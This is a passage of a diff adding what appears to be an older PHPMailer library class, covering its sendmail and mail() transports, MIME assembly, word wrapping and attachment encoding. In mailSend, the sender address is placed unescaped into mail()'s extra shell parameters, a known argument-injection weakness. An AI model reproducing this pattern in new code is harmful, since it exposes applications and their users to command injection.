+                throw $exc;
+            }
+        }
+        return false;
+    }
+
+    protected function sendmailSend($header, $body)
+    {
+        if ($this-&gt;Sender != '') {
+            if ($this-&gt;Mailer == 'qmail') {
+                $sendmail = sprintf('%s -f%s', escapeshellcmd($this-&gt;Sendmail), escapeshellarg($this-&gt;Sender));
+            } else {
+                $sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this-&gt;Sendmail), escapeshellarg($this-&gt;Sender));
+            }
+        } else {
+            if ($this-&gt;Mailer == 'qmail') {
+                $sendmail = sprintf('%s', escapeshellcmd($this-&gt;Sendmail));
+            } else {
+                $sendmail = sprintf('%s -oi -t', escapeshellcmd($this-&gt;Sendmail));
+            }
+        }
+        if ($this-&gt;SingleTo) {
+            foreach ($this-&gt;SingleToArray as $toAddr) {
+                if (!@$mail = popen($sendmail, 'w')) {
+                    throw new phpmailerException($this-&gt;lang('execute') . $this-&gt;Sendmail, self::STOP_CRITICAL);
+                }
+                fputs($mail, 'To: ' . $toAddr . &quot;\n&quot;);
+                fputs($mail, $header);
+                fputs($mail, $body);
+                $result = pclose($mail);
+                $this-&gt;doCallback(($result == 0), array(
+                    $toAddr
+                ), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);
+                if ($result != 0) {
+                    throw new phpmailerException($this-&gt;lang('execute') . $this-&gt;Sendmail, self::STOP_CRITICAL);
+                }
+            }
+        } else {
+            if (!@$mail = popen($sendmail, 'w')) {
+                throw new phpmailerException($this-&gt;lang('execute') . $this-&gt;Sendmail, self::STOP_CRITICAL);
+            }
+            fputs($mail, $header);
+            fputs($mail, $body);
+            $result = pclose($mail);
+            $this-&gt;doCallback(($result == 0), $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);
+            if ($result != 0) {
+                throw new phpmailerException($this-&gt;lang('execute') . $this-&gt;Sendmail, self::STOP_CRITICAL);
+            }
+        }
+        return true;
+    }
+
+    protected function mailSend($header, $body)
+    {
+        $toArr = array();
+        foreach ($this-&gt;to as $toaddr) {
+            $toArr[] = $this-&gt;addrFormat($toaddr);
+        }
+        $to = implode(', ', $toArr);
+
+        if (empty($this-&gt;Sender)) {
+            $params = ' ';
+        } else {
+            $params = sprintf('-f%s', $this-&gt;Sender);
+        }
+        if ($this-&gt;Sender != '' and !ini_get('safe_mode')) {
+            $old_from = ini_get('sendmail_from');
+            ini_set('sendmail_from', $this-&gt;Sender);
+        }
+        $result = false;
+        if ($this-&gt;SingleTo &amp;&amp; count($toArr) &gt; 1) {
+            foreach ($toArr as $toAddr) {
+                $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);
+                $this-&gt;doCallback($result, array(
+                    $toAddr
+                ), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);
+            }
+        } else {
+            $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params);
+            $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);
+        }
+        if (isset($old_from)) {
+            ini_set('sendmail_from', $old_from);
+        }
+        if (!$result) {
+            throw new phpmailerException($this-&gt;lang('instantiate'), self::STOP_CRITICAL);
+        }
+        return true;
+    }
+
+    public function setLanguage($langcode = 'en', $lang_path = '')
+    {
+        // Define full set of translatable strings in English
+        $PHPMAILER_LANG = array(
+            'authenticate' =&gt; 'SMTP Error: Could not authenticate.',
+            'connect_host' =&gt; 'SMTP Error: Could not connect to SMTP host.',
+            'data_not_accepted' =&gt; 'SMTP Error: data not accepted.',
+            'empty_message' =&gt; 'Message body empty',
+            'encoding' =&gt; 'Unknown encoding: ',
+            'execute' =&gt; 'Could not execute: ',
+            'file_access' =&gt; 'Could not access file: ',
+            'file_open' =&gt; 'File Error: Could not open file: ',
+            'from_failed' =&gt; 'The following From address failed: ',
+            'instantiate' =&gt; 'Could not instantiate mail function.',
+            'invalid_address' =&gt; 'Invalid address',
+            'mailer_not_supported' =&gt; ' mailer is not supported.',
+            'provide_address' =&gt; 'You must provide at least one recipient email address.',
+            'recipients_failed' =&gt; 'SMTP Error: The following recipients failed: ',
+            'signing' =&gt; 'Signing Error: ',
+            'smtp_connect_failed' =&gt; 'SMTP connect() failed.',
+            'smtp_error' =&gt; 'SMTP server error: ',
+            'variable_set' =&gt; 'Cannot set or reset variable: '
+        );
+        if (empty($lang_path)) {
+            // Calculate an absolute path so it can work if CWD is not here
+            $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR;
+        }
+        $foundlang = true;
+        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
+        if ($langcode != 'en') { // There is no English translation file
+            // Make sure language file path is readable
+            if (!is_readable($lang_file)) {
+                $foundlang = false;
+            } else {
+                $foundlang = include $lang_file;
+            }
+        }
+        $this-&gt;language = $PHPMAILER_LANG;
+        return (boolean) $foundlang; // Returns false if language not found
+    }
+
+    public function getTranslations()
+    {
+        return $this-&gt;language;
+    }
+
+    public function addrAppend($type, $addr)
+    {
+        $addresses = array();
+        foreach ($addr as $address) {
+            $addresses[] = $this-&gt;addrFormat($address);
+        }
+        return $type . ': ' . implode(', ', $addresses) . $this-&gt;LE;
+    }
+
+
+    public function addrFormat($addr)
+    {
+        if (empty($addr[1])) { // No name provided
+            return $this-&gt;secureHeader($addr[0]);
+        } else {
+            return $this-&gt;encodeHeader($this-&gt;secureHeader($addr[1]), 'phrase') . ' &lt;' . $this-&gt;secureHeader($addr[0]) . '&gt;';
+        }
+    }
+
+
+    public function wrapText($message, $length, $qp_mode = false)
+    {
+        $soft_break = ($qp_mode) ? sprintf(' =%s', $this-&gt;LE) : $this-&gt;LE;
+
+        $is_utf8 = (strtolower($this-&gt;CharSet) == 'utf-8');
+        $lelen   = strlen($this-&gt;LE);
+        $crlflen = strlen(self::CRLF);
+
+        $message = $this-&gt;fixEOL($message);
+        if (substr($message, -$lelen) == $this-&gt;LE) {
+            $message = substr($message, 0, -$lelen);
+        }
+
+        $line    = explode($this-&gt;LE, $message); // Magic. We know fixEOL uses $LE
+        $message = '';
+        for ($i = 0; $i &lt; count($line); $i++) {
+            $line_part = explode(' ', $line[$i]);
+            $buf       = '';
+            for ($e = 0; $e &lt; count($line_part); $e++) {
+                $word = $line_part[$e];
+                if ($qp_mode and (strlen($word) &gt; $length)) {
+                    $space_left = $length - strlen($buf) - $crlflen;
+                    if ($e != 0) {
+                        if ($space_left &gt; 20) {
+                            $len = $space_left;
+                            if ($is_utf8) {
+                                $len = $this-&gt;utf8CharBoundary($word, $len);
+                            } elseif (substr($word, $len - 1, 1) == '=') {
+                                $len--;
+                            } elseif (substr($word, $len - 2, 1) == '=') {
+                                $len -= 2;
+                            }
+                            $part = substr($word, 0, $len);
+                            $word = substr($word, $len);
+                            $buf .= ' ' . $part;
+                            $message .= $buf . sprintf('=%s', self::CRLF);
+                        } else {
+                            $message .= $buf . $soft_break;
+                        }
+                        $buf = '';
+                    }
+                    while (strlen($word) &gt; 0) {
+                        if ($length &lt;= 0) {
+                            break;
+                        }
+                        $len = $length;
+                        if ($is_utf8) {
+                            $len = $this-&gt;utf8CharBoundary($word, $len);
+                        } elseif (substr($word, $len - 1, 1) == '=') {
+                            $len--;
+                        } elseif (substr($word, $len - 2, 1) == '=') {
+                            $len -= 2;
+                        }
+                        $part = substr($word, 0, $len);
+                        $word = substr($word, $len);
+
+                        if (strlen($word) &gt; 0) {
+                            $message .= $part . sprintf('=%s', self::CRLF);
+                        } else {
+                            $buf = $part;
+                        }
+                    }
+                } else {
+                    $buf_o = $buf;
+                    $buf .= ($e == 0) ? $word : (' ' . $word);
+
+                    if (strlen($buf) &gt; $length and $buf_o != '') {
+                        $message .= $buf_o . $soft_break;
+                        $buf = $word;
+                    }
+                }
+            }
+            $message .= $buf . self::CRLF;
+        }
+
+        return $message;
+    }
+
+    public function utf8CharBoundary($encodedText, $maxLength)
+    {
+        $foundSplitPos = false;
+        $lookBack      = 3;
+        while (!$foundSplitPos) {
+            $lastChunk      = substr($encodedText, $maxLength - $lookBack, $lookBack);
+            $encodedCharPos = strpos($lastChunk, '=');
+            if (false !== $encodedCharPos) {
+                // Found start of encoded character byte within $lookBack block.
+                // Check the encoded byte value (the 2 chars after the '=')
+                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
+                $dec = hexdec($hex);
+                if ($dec &lt; 128) { // Single byte character.
+                    // If the encoded char was found at pos 0, it will fit
+                    // otherwise reduce maxLength to start of the encoded char
+                    $maxLength     = ($encodedCharPos == 0) ? $maxLength : $maxLength - ($lookBack - $encodedCharPos);
+                    $foundSplitPos = true;
+                } elseif ($dec &gt;= 192) { // First byte of a multi byte character
+                    // Reduce maxLength to split at start of character
+                    $maxLength     = $maxLength - ($lookBack - $encodedCharPos);
+                    $foundSplitPos = true;
+                } elseif ($dec &lt; 192) { // Middle byte of a multi byte character, look further back
+                    $lookBack += 3;
+                }
+            } else {
+                // No encoded character found
+                $foundSplitPos = true;
+            }
+        }
+        return $maxLength;
+    }
+
+    public function setWordWrap()
+    {
+        if ($this-&gt;WordWrap &lt; 1) {
+            return;
+        }
+
+        switch ($this-&gt;message_type) {
+            case 'alt':
+            case 'alt_inline':
+            case 'alt_attach':
+            case 'alt_inline_attach':
+                $this-&gt;AltBody = $this-&gt;wrapText($this-&gt;AltBody, $this-&gt;WordWrap);
+                break;
+            default:
+                $this-&gt;Body = $this-&gt;wrapText($this-&gt;Body, $this-&gt;WordWrap);
+                break;
+        }
+    }
+
+    public function createHeader()
+    {
+        $result = '';
+
+        // Set the boundaries
+        $uniq_id           = md5(uniqid(time()));
+        $this-&gt;boundary[1] = 'b1_' . $uniq_id;
+        $this-&gt;boundary[2] = 'b2_' . $uniq_id;
+        $this-&gt;boundary[3] = 'b3_' . $uniq_id;
+
+        if ($this-&gt;MessageDate == '') {
+            $this-&gt;MessageDate = self::rfcDate();
+        }
+        $result .= $this-&gt;headerLine('Date', $this-&gt;MessageDate);
+
+
+        // To be created automatically by mail()
+        if ($this-&gt;SingleTo) {
+            if ($this-&gt;Mailer != 'mail') {
+                foreach ($this-&gt;to as $toaddr) {
+                    $this-&gt;SingleToArray[] = $this-&gt;addrFormat($toaddr);
+                }
+            }
+        } else {
+            if (count($this-&gt;to) &gt; 0) {
+                if ($this-&gt;Mailer != 'mail') {
+                    $result .= $this-&gt;addrAppend('To', $this-&gt;to);
+                }
+            } elseif (count($this-&gt;cc) == 0) {
+                $result .= $this-&gt;headerLine('To', 'undisclosed-recipients:;');
+            }
+        }
+
+        $result .= $this-&gt;addrAppend('From', array(
+            array(
+                trim($this-&gt;From),
+                $this-&gt;FromName
+            )
+        ));
+
+        // sendmail and mail() extract Cc from the header before sending
+        if (count($this-&gt;cc) &gt; 0) {
+            $result .= $this-&gt;addrAppend('Cc', $this-&gt;cc);
+        }
+
+        // sendmail and mail() extract Bcc from the header before sending
+        if (($this-&gt;Mailer == 'sendmail' or $this-&gt;Mailer == 'qmail' or $this-&gt;Mailer == 'mail') and count($this-&gt;bcc) &gt; 0) {
+            $result .= $this-&gt;addrAppend('Bcc', $this-&gt;bcc);
+        }
+
+        if (count($this-&gt;ReplyTo) &gt; 0) {
+            $result .= $this-&gt;addrAppend('Reply-To', $this-&gt;ReplyTo);
+        }
+
+        // mail() sets the subject itself
+        if ($this-&gt;Mailer != 'mail') {
+            $result .= $this-&gt;headerLine('Subject', $this-&gt;encodeHeader($this-&gt;secureHeader($this-&gt;Subject)));
+        }
+
+        if ($this-&gt;MessageID != '') {
+            $this-&gt;lastMessageID = $this-&gt;MessageID;
+        } else {
+            $this-&gt;lastMessageID = sprintf('&lt;%s@%s&gt;', $uniq_id, $this-&gt;ServerHostname());
+        }
+        $result .= $this-&gt;HeaderLine('Message-ID', $this-&gt;lastMessageID);
+        $result .= $this-&gt;headerLine('X-Priority', $this-&gt;Priority);
+        if ($this-&gt;XMailer == '') {
+            $result .= $this-&gt;headerLine('X-Mailer', 'PHPMailer ' . $this-&gt;Version . ' (https://github.com/PHPMailer/PHPMailer/)');
+        } else {
+            $myXmailer = trim($this-&gt;XMailer);
+            if ($myXmailer) {
+                $result .= $this-&gt;headerLine('X-Mailer', $myXmailer);
+            }
+        }
+
+        if ($this-&gt;ConfirmReadingTo != '') {
+            $result .= $this-&gt;headerLine('Disposition-Notification-To', '&lt;' . trim($this-&gt;ConfirmReadingTo) . '&gt;');
+        }
+
+        // Add custom headers
+        for ($index = 0; $index &lt; count($this-&gt;CustomHeader); $index++) {
+            $result .= $this-&gt;headerLine(trim($this-&gt;CustomHeader[$index][0]), $this-&gt;encodeHeader(trim($this-&gt;CustomHeader[$index][1])));
+        }
+        if (!$this-&gt;sign_key_file) {
+            $result .= $this-&gt;headerLine('MIME-Version', '1.0');
+            $result .= $this-&gt;getMailMIME();
+        }
+
+        return $result;
+    }
+
+    public function getMailMIME()
+    {
+        $result      = '';
+        $ismultipart = true;
+        switch ($this-&gt;message_type) {
+            case 'inline':
+                $result .= $this-&gt;headerLine('Content-Type', 'multipart/related;');
+                $result .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[1] . '&quot;');
+                break;
+            case 'attach':
+            case 'inline_attach':
+            case 'alt_attach':
+            case 'alt_inline_attach':
+                $result .= $this-&gt;headerLine('Content-Type', 'multipart/mixed;');
+                $result .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[1] . '&quot;');
+                break;
+            case 'alt':
+            case 'alt_inline':
+                $result .= $this-&gt;headerLine('Content-Type', 'multipart/alternative;');
+                $result .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[1] . '&quot;');
+                break;
+            default:
+                // Catches case 'plain': and case '':
+                $result .= $this-&gt;textLine('Content-Type: ' . $this-&gt;ContentType . '; charset=' . $this-&gt;CharSet);
+                $ismultipart = false;
+                break;
+        }
+        // RFC1341 part 5 says 7bit is assumed if not specified
+        if ($this-&gt;Encoding != '7bit') {
+            // RFC 2045 section 6.4 says multipart MIME parts may only use 7bit, 8bit or binary CTE
+            if ($ismultipart) {
+                if ($this-&gt;Encoding == '8bit') {
+                    $result .= $this-&gt;headerLine('Content-Transfer-Encoding', '8bit');
+                }
+                // The only remaining alternatives are quoted-printable and base64, which are both 7bit compatible
+            } else {
+                $result .= $this-&gt;headerLine('Content-Transfer-Encoding', $this-&gt;Encoding);
+            }
+        }
+
+        if ($this-&gt;Mailer != 'mail') {
+            $result .= $this-&gt;LE;
+        }
+
+        return $result;
+    }
+
+    public function getSentMIMEMessage()
+    {
+        return $this-&gt;MIMEHeader . $this-&gt;mailHeader . self::CRLF . $this-&gt;MIMEBody;
+    }
+
+
+    public function createBody()
+    {
+        $body = '';
+
+        if ($this-&gt;sign_key_file) {
+            $body .= $this-&gt;getMailMIME() . $this-&gt;LE;
+        }
+
+        $this-&gt;setWordWrap();
+
+        $bodyEncoding = $this-&gt;Encoding;
+        $bodyCharSet  = $this-&gt;CharSet;
+        if ($bodyEncoding == '8bit' and !$this-&gt;has8bitChars($this-&gt;Body)) {
+            $bodyEncoding = '7bit';
+            $bodyCharSet  = 'us-ascii';
+        }
+        $altBodyEncoding = $this-&gt;Encoding;
+        $altBodyCharSet  = $this-&gt;CharSet;
+        if ($altBodyEncoding == '8bit' and !$this-&gt;has8bitChars($this-&gt;AltBody)) {
+            $altBodyEncoding = '7bit';
+            $altBodyCharSet  = 'us-ascii';
+        }
+        switch ($this-&gt;message_type) {
+            case 'inline':
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[1], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;attachAll('inline', $this-&gt;boundary[1]);
+                break;
+            case 'attach':
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[1], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;attachAll('attachment', $this-&gt;boundary[1]);
+                break;
+            case 'inline_attach':
+                $body .= $this-&gt;textLine('--' . $this-&gt;boundary[1]);
+                $body .= $this-&gt;headerLine('Content-Type', 'multipart/related;');
+                $body .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[2] . '&quot;');
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[2], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;attachAll('inline', $this-&gt;boundary[2]);
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;attachAll('attachment', $this-&gt;boundary[1]);
+                break;
+            case 'alt':
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;AltBody, $altBodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                if (!empty($this-&gt;Ical)) {
+                    $body .= $this-&gt;getBoundary($this-&gt;boundary[1], '', 'text/calendar; method=REQUEST', '');
+                    $body .= $this-&gt;encodeString($this-&gt;Ical, $this-&gt;Encoding);
+                    $body .= $this-&gt;LE . $this-&gt;LE;
+                }
+                $body .= $this-&gt;endBoundary($this-&gt;boundary[1]);
+                break;
+            case 'alt_inline':
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;AltBody, $altBodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;textLine('--' . $this-&gt;boundary[1]);
+                $body .= $this-&gt;headerLine('Content-Type', 'multipart/related;');
+                $body .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[2] . '&quot;');
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;attachAll('inline', $this-&gt;boundary[2]);
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;endBoundary($this-&gt;boundary[1]);
+                break;
+            case 'alt_attach':
+                $body .= $this-&gt;textLine('--' . $this-&gt;boundary[1]);
+                $body .= $this-&gt;headerLine('Content-Type', 'multipart/alternative;');
+                $body .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[2] . '&quot;');
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;AltBody, $altBodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;endBoundary($this-&gt;boundary[2]);
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;attachAll('attachment', $this-&gt;boundary[1]);
+                break;
+            case 'alt_inline_attach':
+                $body .= $this-&gt;textLine('--' . $this-&gt;boundary[1]);
+                $body .= $this-&gt;headerLine('Content-Type', 'multipart/alternative;');
+                $body .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[2] . '&quot;');
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;AltBody, $altBodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;textLine('--' . $this-&gt;boundary[2]);
+                $body .= $this-&gt;headerLine('Content-Type', 'multipart/related;');
+                $body .= $this-&gt;textLine(&quot;\tboundary=\&quot;&quot; . $this-&gt;boundary[3] . '&quot;');
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;getBoundary($this-&gt;boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                $body .= $this-&gt;LE . $this-&gt;LE;
+                $body .= $this-&gt;attachAll('inline', $this-&gt;boundary[3]);
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;endBoundary($this-&gt;boundary[2]);
+                $body .= $this-&gt;LE;
+                $body .= $this-&gt;attachAll('attachment', $this-&gt;boundary[1]);
+                break;
+            default:
+                // catch case 'plain' and case ''
+                $body .= $this-&gt;encodeString($this-&gt;Body, $bodyEncoding);
+                break;
+        }
+
+        if ($this-&gt;isError()) {
+            $body = '';
+        } elseif ($this-&gt;sign_key_file) {
+            try {
+                if (!defined('PKCS7_TEXT')) {
+                    throw new phpmailerException($this-&gt;lang('signing') . ' OpenSSL extension missing.');
+                }
+                // @TODO would be nice to use php://temp streams here, but need to wrap for PHP &lt; 5.1
+                $file = tempnam(sys_get_temp_dir(), 'mail');
+                if (false === file_put_contents($file, $body)) {
+                    throw new phpmailerException($this-&gt;lang('signing') . ' Could not write temp file');
+                }
+                $signed = tempnam(sys_get_temp_dir(), 'signed');
+                if (@openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this-&gt;sign_cert_file), array(
+                    'file://' . realpath($this-&gt;sign_key_file),
+                    $this-&gt;sign_key_pass
+                ), null)) {
+                    @unlink($file);
+                    $body = file_get_contents($signed);
+                    @unlink($signed);
+                } else {
+                    @unlink($file);
+                    @unlink($signed);
+                    throw new phpmailerException($this-&gt;lang('signing') . openssl_error_string());
+                }
+            }
+            catch (phpmailerException $exc) {
+                $body = '';
+                if ($this-&gt;exceptions) {
+                    throw $exc;
+                }
+            }
+        }
+        return $body;
+    }
+
+    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
+    {
+        $result = '';
+        if ($charSet == '') {
+            $charSet = $this-&gt;CharSet;
+        }
+        if ($contentType == '') {
+            $contentType = $this-&gt;ContentType;
+        }
+        if ($encoding == '') {
+            $encoding = $this-&gt;Encoding;
+        }
+        $result .= $this-&gt;textLine('--' . $boundary);
+        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
+        $result .= $this-&gt;LE;
+        // RFC1341 part 5 says 7bit is assumed if not specified
+        if ($encoding != '7bit') {
+            $result .= $this-&gt;headerLine('Content-Transfer-Encoding', $encoding);
+        }
+        $result .= $this-&gt;LE;
+
+        return $result;
+    }
+
+    protected function endBoundary($boundary)
+    {
+        return $this-&gt;LE . '--' . $boundary . '--' . $this-&gt;LE;
+    }
+
+    protected function setMessageType()
+    {
+        $type = array();
+        if ($this-&gt;alternativeExists()) {
+            $type[] = 'alt';
+        }
+        if ($this-&gt;inlineImageExists()) {
+            $type[] = 'inline';
+        }
+        if ($this-&gt;attachmentExists()) {
+            $type[] = 'attach';
+        }
+        $this-&gt;message_type = implode('_', $type);
+        if ($this-&gt;message_type == '') {
+            $this-&gt;message_type = 'plain';
+        }
+    }
+
+    public function headerLine($name, $value)
+    {
+        return $name . ': ' . $value . $this-&gt;LE;
+    }
+
+    public function textLine($value)
+    {
+        return $value . $this-&gt;LE;
+    }
+
+    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
+    {
+        try {
+            if (!@is_file($path)) {
+                throw new phpmailerException($this-&gt;lang('file_access') . $path, self::STOP_CONTINUE);
+            }
+
+            // If a MIME type is not specified, try to work it out from the file name
+            if ($type == '') {
+                $type = self::filenameToType($path);
+            }
+
+            $filename = basename($path);
+            if ($name == '') {
+                $name = $filename;
+            }
+
+            $this-&gt;attachment[] = array(
+                0 =&gt; $path,
+                1 =&gt; $filename,
+                2 =&gt; $name,
+                3 =&gt; $encoding,
+                4 =&gt; $type,
+                5 =&gt; false, // isStringAttachment
+                6 =&gt; $disposition,
+                7 =&gt; 0
+            );
+
+        }
+        catch (phpmailerException $exc) {
+            $this-&gt;setError($exc-&gt;getMessage());
+            $this-&gt;edebug($exc-&gt;getMessage());
+            if ($this-&gt;exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+        return true;
+    }
+
+    public function getAttachments()
+    {
+        return $this-&gt;attachment;
+    }
+
+    protected function attachAll($disposition_type, $boundary)
+    {
+        // Return text of body
+        $mime    = array();
+        $cidUniq = array();
+        $incl    = array();
+
+        // Add all attachments
+        foreach ($this-&gt;attachment as $attachment) {
+            // Check if it is a valid disposition_filter
+            if ($attachment[6] == $disposition_type) {
+                // Check for string attachment
+                $string  = '';
+                $path    = '';
+                $bString = $attachment[5];
+                if ($bString) {
+                    $string = $attachment[0];
+                } else {
+                    $path = $attachment[0];
+                }
+
+                $inclhash = md5(serialize($attachment));
+                if (in_array($inclhash, $incl)) {
+                    continue;
+                }
+                $incl[]      = $inclhash;
+                $name        = $attachment[2];
+                $encoding    = $attachment[3];
+                $type        = $attachment[4];
+                $disposition = $attachment[6];
+                $cid         = $attachment[7];
+                if ($disposition == 'inline' &amp;&amp; isset($cidUniq[$cid])) {
+                    continue;
+                }
+                $cidUniq[$cid] = true;
+
+                $mime[] = sprintf('--%s%s', $boundary, $this-&gt;LE);
+                $mime[] = sprintf('Content-Type: %s; name=&quot;%s&quot;%s', $type, $this-&gt;encodeHeader($this-&gt;secureHeader($name)), $this-&gt;LE);
+                // RFC1341 part 5 says 7bit is assumed if not specified
+                if ($encoding != '7bit') {
+                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this-&gt;LE);
+                }
+
+                if ($disposition == 'inline') {
+                    $mime[] = sprintf('Content-ID: &lt;%s&gt;%s', $cid, $this-&gt;LE);
+                }
+
+                // If a filename contains any of these chars, it should be quoted,
+                // but not otherwise: RFC2183 &amp; RFC2045 5.1
+                // Fixes a warning in IETF's msglint MIME checker
+                // Allow for bypassing the Content-Disposition header totally
+                if (!(empty($disposition))) {
+                    $encoded_name = $this-&gt;encodeHeader($this-&gt;secureHeader($name));
+                    if (preg_match('/[ \(\)&lt;&gt;@,;:\\&quot;\/\[\]\?=]/', $encoded_name)) {
+                        $mime[] = sprintf('Content-Disposition: %s; filename=&quot;%s&quot;%s', $disposition, $encoded_name, $this-&gt;LE . $this-&gt;LE);
+                    } else {
+                        $mime[] = sprintf('Content-Disposition: %s; filename=%s%s', $disposition, $encoded_name, $this-&gt;LE . $this-&gt;LE);
+                    }
+                } else {
+                    $mime[] = $this-&gt;LE;
+                }
+
+                // Encode as string attachment
+                if ($bString) {
+                    $mime[] = $this-&gt;encodeString($string, $encoding);
+                    if ($this-&gt;isError()) {
+                        return '';
+                    }
+                    $mime[] = $this-&gt;LE . $this-&gt;LE;
+                } else {
+                    $mime[] = $this-&gt;encodeFile($path, $encoding);
+                    if ($this-&gt;isError()) {
+                        return '';
+                    }
+                    $mime[] = $this-&gt;LE . $this-&gt;LE;
+                }
+            }
+        }
+
+        $mime[] = sprintf('--%s--%s', $boundary, $this-&gt;LE);
+
+        return implode('', $mime);
+    }
+
+    protected function encodeFile($path, $encoding = 'base64')
+    {
+        try {
+            if (!is_readable($path)) {
+                throw new phpmailerException($this-&gt;lang('file_open') . $path, self::STOP_CONTINUE);
+            }
+            $magic_quotes = get_magic_quotes_runtime();
+            if ($magic_quotes) {
+                if (version_compare(PHP_VERSION, '5.3.0', '&lt;')) {
+                    set_magic_quotes_runtime(false);
+                } else {
+                    ini_set('magic_quotes_runtime', 0);
+                }
+            }
+            $file_buffer = file_get_contents($path);
+            $file_buffer = $this-&gt;encodeString($file_buffer, $encoding);
+            if ($magic_quotes) {
+                if (version_compare(PHP_VERSION, '5.3.0', '&lt;')) {
+                    set_magic_quotes_runtime($magic_quotes);
+                } else {
+                    ini_set('magic_quotes_runtime', ($magic_quotes ? '1' : '0'));
+                }
+            }
+            return $file_buffer;
+        }
+        catch (Exception $exc) {
+            $this-&gt;setError($exc-&gt;getMessage());
+            return '';
+        }
+    }
+
+    public function encodeString($str, $encoding = 'base64')
+    {
+        $encoded = '';
+        switch (strtolower($encoding)) {
+            case 'base64':
+                $encoded = chunk_split(base64_encode($str), 76, $this-&gt;LE);
+                break;
+            case '7bit':
+            case '8bit':
+                $encoded = $this-&gt;fixEOL($str);
+                // Make sure it ends with a line break
+                if (substr($encoded, -(strlen($this-&gt;LE))) != $this-&gt;LE) {
+                    $encoded .= $this-&gt;LE;
+                }
+                break;
+            case 'binary':
+                $encoded = $str;
+                break;
+            case 'quoted-printable':
+                $encoded = $this-&gt;encodeQP($str);
+                break;
+            default:
+                $this-&gt;setError($this-&gt;lang('encoding') . $encoding);
+                break;
+        }
+        return $encoded;
+    }
+
+    public function encodeHeader($str, $position = 'text')
+    {
+        $matchcount = 0;
+        switch (strtolower($position)) {
+            case 'phrase':
+                if (!preg_match('/[\200-\377]/', $str)) {
+                    // Can't use addslashes as we don't know the value of magic_quotes_sybase
+                    $encoded = addcslashes($str, &quot;\0..\37\177\\\&quot;&quot;);
